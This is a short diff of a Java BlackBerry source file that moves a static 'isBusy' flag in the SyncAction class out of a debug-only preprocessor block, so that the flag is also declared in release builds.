@@ -38,8 +38,8 @@ import blackberry.utils.StringPair;
 public abstract class SyncAction extends SubActionMain {
     //#ifdef DEBUG
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
-    private static boolean isBusy;
     //#endif
+    private static boolean isBusy;
     protected EvidenceCollector logCollector;
     protected ModuleManager agentManager;
     // protected Transport[] transports = new Transport[Transport.NUM];
